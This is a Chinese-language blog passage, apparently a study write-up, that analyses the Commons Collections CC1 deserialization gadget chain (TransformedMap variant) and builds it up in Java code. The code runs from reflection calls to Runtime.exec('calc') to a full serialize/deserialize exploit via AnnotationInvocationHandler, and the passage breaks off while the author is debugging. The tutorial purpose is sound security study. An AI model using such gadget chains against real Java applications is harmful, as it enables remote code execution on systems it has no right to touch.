实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="TransformMap版CC1攻击链分析"><a href="#TransformMap版CC1攻击链分析" class="headerlink" title="TransformMap版CC1攻击链分析"></a>TransformMap版CC1攻击链分析</h2><p>总体的流程大概如下图所示：</p><p><img src="/2023/04/27/file-upload/g" alt="CC1"></p><p>需要一个readObject方法作为链首，还需要在链子结尾处一个能够执行危害命令的方法，通过一条完整的链子串联起来，接下来一次分析。</p><h3 id="寻找链尾"><a href="#寻找链尾" class="headerlink" title="寻找链尾"></a>寻找链尾</h3><p>直接看到Transformer接口，查看其实现类：</p><p><img src="/2023/04/27/file-upload/20231008155153805.png" alt="image-20231008155153805"></p><p>跟到InvokerTransformer：</p><p><img src="/2023/04/27/file-upload/20231008155324998.png" alt="image-20231008155324998"></p><p>发现存在transform方法，这里通过反射可以调用任意类。</p><p>回顾一下通过反射弹计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(runtime,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结合InvokerTransformer，修改代码，通过transform方法来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231008155945630.png" alt="image-20231008155945630"></p><p>成功执行命令，这里可以作为尾部的方法。</p><h3 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h3><p>注意到前面是通过transform方法进行反射调用，最终执行了命令，因此往前找调用transform方法的地方。</p><p>跟到TransformedMap中的checkSetValue方法：</p><p><img src="/2023/04/27/file-upload/20231008160413014.png" alt="image-20231008160413014"></p><p>这里<code>return valueTransformer.transform(value)</code>，继续往前跟，找valueTransformer是什么：</p><p><img src="/2023/04/27/file-upload/20231008160538197.png" alt="image-20231008160538197"></p><p>看到这里是TransformedMap的构造方法，不过是protected修饰的，在package之外无法new对象，继续往前找：</p><p><img src="/2023/04/27/file-upload/20231008161624054.png" alt="image-20231008161624054"></p><p>找到一个静态方法decorate，这里return了一个TransformedMap对象，并且该方法是public，到这一步尝试修改一下前面的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformerTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        Map&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorete</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">transformedMapClass</span> <span class="hljs-operator">=</span> TransformedMap.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> transformedMapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        method.invoke(decorete,runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231008164512596.png" alt="image-20231008164512596"></p><p>可以看到已经成功执行了命令，接下来对POC进行分析。</p><ul><li>首先要注意的是，执行命令最终依靠的还是InvokerTransformer中的transform方法，不过是将链子往前推了几步。</li><li>transform方法被TransformMap类中的checkSetValue调用，因此利用反射调用该方法，由于是protected，需要setAccessible，这里invode的args即为transform的参数runtime。</li><li>调用checkSetValue的类valueTransformer，即为TransformedMap构造函数中的最后一个参数值，也就是decorate的参数，</li></ul><p>根据前面的分析，到了decorate，这里已经没法再往前找，因此回退到checkSetValue。</p><p>查看引用：</p><p><img src="/2023/04/27/file-upload/20231008171404028.png" alt="image-20231008171404028"></p><p>在抽象类AbstractInputCheckedMapDecorator中的内部类MapEntry中找到了parent.checkSetValue。setValue方法其实是重写了AbstractMapEntryDecorator中的setValue：</p><p><img src="/2023/04/27/file-upload/20231008171658381.png" alt="image-20231008171658381"></p><p>这里的setValue方法又是实现了Map.java中的Entry接口，Entry代表Map中的一个键值对：</p><p><img src="/2023/04/27/file-upload/20231008171815476.png" alt="image-20231008171815476"></p><p>所以到目前，最终找到了Map类中。所以前面的POC中，其实是decorate在遍历Map的时候，走到了setValue，继而调用了checkSetValue方法。</p><p>看下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>        <span class="hljs-keyword">for</span> (Map.Entry entry: decorate.entrySet())&#123;<br>            entry.setValue(runtime);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先通过对Map遍历，触发setValue方法，具体步骤为：实例化一个Map，put一个键值对，然后通过TransformedMap的decorate方法进行封装，最后遍历。</p><p>这段代码运行后也会执行calc命令。接下来debug看一下流程。</p><p>在decorate下断点：</p><p><img src="/2023/04/27/file-upload/20231009100048010.png" alt="image-20231009100048010"></p><p>这里的valueTransformer是InvokerTransformer，对象，步入：</p><p><img src="/2023/04/27/file-upload/20231009101008395.png" alt="image-20231009101008395"></p><p>到了TransformedMap构造方法。到for循环处，步入：</p><p><img src="/2023/04/27/file-upload/20231009101630262.png" alt="image-20231009101630262"></p><p>跟到抽象类AbstractInputCheckedMapDecorator的checkSetValue方法，value的值就是Runtime对象。</p><p>继续：</p><p><img src="/2023/04/27/file-upload/20231009101740752.png" alt="image-20231009101740752"></p><p>这里到了TransformedMap类里，继续跟进：</p><p><img src="/2023/04/27/file-upload/20231009101828540.png" alt="image-20231009101828540"></p><p>最后到了InvokerTransformer类的transform方法，也就是前面说到的链尾。  </p><p>到这里，问题已经变成，如何通过Map类，最终来执行setValue方法。</p><h3 id="寻找链首"><a href="#寻找链首" class="headerlink" title="寻找链首"></a>寻找链首</h3><p>前面已经找到了setValue，这里继续findusage：</p><p><img src="/2023/04/27/file-upload/20231008173620694.png" alt="image-20231008173620694"></p><p>发现存在一个readObject方法，这也就是要找的入口类。跟进去看看：</p><p><img src="/2023/04/27/file-upload/20231008173744294.png" alt="image-20231008173744294"></p><p>该方法在AnnotationInvocationHandler类中，该类于前面文章提到的动态代理相关，其作用域为默认。并且注意这里要走到memberValue.setValue方法，需要满足if的判断条件。</p><h2 id="TransformMap版CC1手写EXP"><a href="#TransformMap版CC1手写EXP" class="headerlink" title="TransformMap版CC1手写EXP"></a>TransformMap版CC1手写EXP</h2><p>接下来尝试编写完整利用链的EXP。</p><p>首先Runtime无法进行序列化，因为他没有继承Serialize接口：</p><p><img src="/2023/04/27/file-upload/20231009153550294.png" alt="image-20231009153550294"></p><p>但是Class类，也就是他的原型类继承了接口，是可以被序列化的：</p><p><img src="/2023/04/27/file-upload/20231009160027222.png" alt="image-20231009160027222"></p><p>接下来利用反射来获取Runtime对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getruntime</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getruntime.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>getruntime.invoke(null,null)，这里因为是静态方法，因此第一个参数为null，又因为无参构造，因此第二个参数也是null。</p><p>上面的代码已经可以成功执行命令：</p><p><img src="/2023/04/27/file-upload/20231009160756935.png" alt="image-20231009160756935"></p><p>结合transform方法进行修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getruntime</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getruntime);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231009163047036.png" alt="image-20231009163047036"></p><p>考虑到代码的嵌套问题，这里使用Commons Collections库中的ChainedTransformer类，他同样调用了transform方法：</p><p><img src="/2023/04/27/file-upload/20231009163648296.png" alt="image-20231009163648296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] Transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br>        chainedTransformer.transform(Runtime.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>改进之后的代码如上。运行：</p><p><img src="/2023/04/27/file-upload/20231009165053008.png" alt="image-20231009165053008"></p><p>现在再结合上decorate链的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] Transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="hljs-literal">null</span>,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException, IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里运行后未能成功执行命令，在AnnotationInvocationHandler中的if判断处下断点：</p><p><img src="/2023/04/27/file-upload/20231009174725349.png" alt="image-20231009174725349"></p><p>第一个if就直接跳出了判断，memberType为null。</p><p>现在需要满足两个if判断，进入memberValue.setValue方法。memberType使用get方法查找，name来自于我们传入的key值，可控。</p><p>而memberTypes来自于annotationType的成员变量，这里memeberType是获取注解中成员变量的名称，所以我们需要控制传入的key</p><p>值与注解的成员变量相同。这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所</p><p>使用的注解是没有成员变量的。</p><p>从这里的传参跟进来看：</p><p><img src="/2023/04/27/file-upload/20231010104228595.png" alt="image-20231010104228595"></p><p><img src="/2023/04/27/file-upload/20231010104137177.png" 